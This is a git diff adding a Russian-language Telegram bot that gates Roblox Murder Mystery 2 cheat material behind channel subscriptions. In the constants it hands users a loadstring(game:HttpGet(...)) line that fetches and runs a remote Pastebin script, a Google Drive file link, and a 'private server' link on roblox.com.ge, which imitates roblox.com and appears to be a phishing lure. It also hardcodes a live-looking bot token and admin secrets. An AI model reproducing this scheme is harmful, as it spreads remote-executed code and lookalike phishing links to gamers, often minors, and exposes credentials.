@@ -1,3 +1,127 @@
+import telebot
+import random
+from telebot import types
+import sqlite3
+import os
+import socket
+from threading import Thread
+import uuid
+
+TOKEN = os.environ.get("TOKEN", "8793302361:AAHCxbHJ6v_oCyjHqiafsHHaf7Xr1EvkDO8")
+ADMIN_ID = 8091608667
+ADMIN_SECRET = "larscriptkryyyyyyt"
+ADMIN_SECRET2 = "кресло качалка"
+
+DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_users.db")
+
+def init_db():
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, lang TEXT DEFAULT 'ru', ref_code TEXT)")
+    c.execute("CREATE TABLE IF NOT EXISTS ref_links (id INTEGER PRIMARY KEY AUTOINCREMENT, link TEXT UNIQUE, message TEXT)")
+    conn.commit()
+    conn.close()
+
+def add_user(user_id, ref_code=None):
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
+    exists = c.fetchone()
+    if not exists:
+        c.execute("INSERT INTO users (user_id, lang, ref_code) VALUES (?, 'ru', ?)", (user_id, ref_code))
+        conn.commit()
+        conn.close()
+        return True
+    else:
+        if ref_code:
+            c.execute("UPDATE users SET ref_code = ? WHERE user_id = ?", (ref_code, user_id))
+            conn.commit()
+    conn.close()
+    return False
+
+def set_lang(user_id, lang):
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("UPDATE users SET lang = ? WHERE user_id = ?", (lang, user_id))
+    conn.commit()
+    conn.close()
+
+def get_lang(user_id):
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,))
+    row = c.fetchone()
+    conn.close()
+    return row[0] if row else 'ru'
+
+def get_user_ref_code(user_id):
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT ref_code FROM users WHERE user_id = ?", (user_id,))
+    row = c.fetchone()
+    conn.close()
+    return row[0] if row else None
+
+def create_ref_link(message):
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    ref = str(uuid.uuid4())[:8]
+    c.execute("INSERT INTO ref_links (link, message) VALUES (?, ?)", (ref, message))
+    conn.commit()
+    conn.close()
+    return ref
+
+def get_ref_message(ref):
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT message FROM ref_links WHERE link = ?", (ref,))
+    row = c.fetchone()
+    conn.close()
+    return row[0] if row else None
+
+def get_all_ref_links():
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT id, link, message FROM ref_links")
+    links = c.fetchall()
+    conn.close()
+    return links
+
+def delete_ref_link(link_id):
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("DELETE FROM ref_links WHERE id = ?", (link_id,))
+    conn.commit()
+    conn.close()
+
+def get_all_users():
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT user_id FROM users")
+    users = [row[0] for row in c.fetchall()]
+    conn.close()
+    return users
+
+def count_users():
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT COUNT(*) FROM users")
+    count = c.fetchone()[0]
+    conn.close()
+    return count
+
+init_db()
+
+CHANNELS = [
+    {"name": "freprivatka34", "url": "https://t.me/freprivatka34"},
+    {"name": "freegodlymm2_67", "url": "https://t.me/freegodlymm2_67"},
+    {"name": "keyscripts3", "url": "https://t.me/keyscripts3"}
+]
+
+KEYS = ["МОПС", "СКИТ", "ТАКСА", "КИТ", "LARS", "MOPS", "ARDOR", "MALTUIPY"]
+PRIVATE_SERVER_LINK = "https://roblox.com.ge/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
+SCRIPT_LINK = "loadstring(game:HttpGet(\"https://pastebin.com/raw/GdQULgA6\"))()"
+DELTA_LINK = "https://drive.google.com/file/d/1G2gniClYv0qV0BU9-xfYD4UOcxUljH4s/view?usp=sharing"
 BOT_USERNAME = "script8748389538954939_bot"
 
 LANG = {
@@ -84,12 +208,6 @@ def t(user_id, key, **kwargs):
     text = LANG.get(lang, LANG["ru"]).get(key, key)
     return text.format(**kwargs) if kwargs else text
 
-def notify_admin(text):
-    try:
-        bot.send_message(ADMIN_ID, text)
-    except:
-        pass
-
 def is_admin(user_id):
     return user_id == ADMIN_ID
 
@@ -152,7 +270,6 @@ def start(message):
     is_ref = len(args) > 1 and args[1].startswith("ref_")
     ref_code = args[1].replace("ref_", "") if is_ref else None
     add_user(message.from_user.id, ref_code)
-    
     if is_ref:
         bot.send_message(message.chat.id, t(message.from_user.id, "start_ref"), reply_markup=get_channels_keyboard(message.from_user.id, is_ref=True))
     else:
@@ -192,11 +309,10 @@ def broadcast_panel(message):
 
 def broadcast_start(message):
     users = get_all_users()
-    text = message.text
     count = 0
     for uid in users:
         try:
-            bot.send_message(uid, text)
+            bot.send_message(uid, message.text)
             count += 1
         except:
             pass
@@ -206,10 +322,8 @@ def broadcast_start(message):
 def user_callback(call):
     action = call.data
     user_id = call.from_user.id
-    
     if action.startswith("lang_"):
         return
-    
     if action in ["check_sub", "check_sub_ref"]:
         is_ref = action == "check_sub_ref"
         not_subbed = get_unsubscribed_channels(user_id)
@@ -217,9 +331,7 @@ def user_callback(call):
             if is_ref:
                 ref_code = get_user_ref_code(user_id)
                 ref_msg = get_ref_message(ref_code) if ref_code else None
-                if not ref_msg:
-                    ref_msg = "✅ Подписка подтверждена! Спасибо!"
-                bot.send_message(call.message.chat.id, ref_msg)
+                bot.send_message(call.message.chat.id, ref_msg if ref_msg else "✅ Подписка подтверждена!")
             else:
                 bot.send_message(call.message.chat.id, t(user_id, "success_check"), reply_markup=get_success_keyboard(user_id))
         else:
@@ -227,27 +339,22 @@ def user_callback(call):
             for ch in not_subbed:
                 text += f"❎ {ch['name']}\n"
             bot.send_message(call.message.chat.id, text, reply_markup=get_unsub_keyboard(not_subbed, user_id, is_ref))
-    
     elif action == "get_script":
         bot.send_message(call.message.chat.id, t(user_id, "script_text", script=SCRIPT_LINK), parse_mode="Markdown")
         bot.answer_callback_query(call.id, "✅")
-    
     elif action == "get_key":
         key = random.choice(KEYS)
         bot.send_message(call.message.chat.id, t(user_id, "key_text", key=key), parse_mode="Markdown")
         bot.answer_callback_query(call.id, "✅")
-    
     elif action == "get_private":
         bot.send_message(call.message.chat.id, t(user_id, "private_text", link=PRIVATE_SERVER_LINK))
         bot.answer_callback_query(call.id, "✅")
-    
     elif action == "admin_ref_create":
         if not is_admin(user_id):
             return
         msg = bot.send_message(call.message.chat.id, t(user_id, "admin_ref_create_prompt"))
         bot.register_next_step_handler(msg, create_ref_with_message)
         bot.answer_callback_query(call.id)
-    
     elif action == "admin_ref_list":
         if not is_admin(user_id):
             return
@@ -258,7 +365,6 @@ def user_callback(call):
             text = "\n".join(f"• `{l[1]}` — {l[2][:30]}" for l in links)
             bot.send_message(call.message.chat.id, t(user_id, "admin_ref_list", count=len(links), list=text), parse_mode="Markdown")
         bot.answer_callback_query(call.id)
-    
     elif action == "admin_ref_del":
         if not is_admin(user_id):
             return
@@ -271,7 +377,6 @@ def user_callback(call):
                 keyboard.add(types.InlineKeyboardButton(f"❌ {l[1]}", callback_data=f"admin_delref_{l[0]}"))
             bot.send_message(call.message.chat.id, "Выбери ссылку для удаления:", reply_markup=keyboard)
         bot.answer_callback_query(call.id)
-    
     elif action.startswith("admin_delref_"):
         if not is_admin(user_id):
             return
@@ -279,14 +384,12 @@ def user_callback(call):
         delete_ref_link(link_id)
         bot.send_message(call.message.chat.id, t(user_id, "admin_ref_delete"))
         bot.answer_callback_query(call.id)
-    
     elif action == "admin_stats":
         if not is_admin(user_id):
             return
         refs = len(get_all_ref_links())
         bot.send_message(call.message.chat.id, t(user_id, "admin_stats", users=count_users(), refs=refs), parse_mode="Markdown")
         bot.answer_callback_query(call.id)
-    
     elif action == "admin_users_list":
         if not is_admin(user_id):
             return
@@ -299,14 +402,12 @@ def user_callback(call):
                 text += f"\n... и ещё {len(users) - 50}"
             bot.send_message(call.message.chat.id, t(user_id, "admin_users_list", count=len(users), list=text), parse_mode="Markdown")
         bot.answer_callback_query(call.id)
-    
     elif action == "admin_broadcast":
         if not is_admin(user_id):
             return
         msg = bot.send_message(call.message.chat.id, t(user_id, "admin_broadcast_prompt", count=count_users()))
         bot.register_next_step_handler(msg, broadcast_start)
         bot.answer_callback_query(call.id)
-    
     else:
         bot.answer_callback_query(call.id)
 
@@ -323,7 +424,6 @@ def run_server():
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind(('0.0.0.0', port))
     s.listen(1)
-    print(f"Port {port} opened")
     while True:
         c, _ = s.accept()
         c.send(b"HTTP/1.1 200 OK\r\n\r\nBot running")
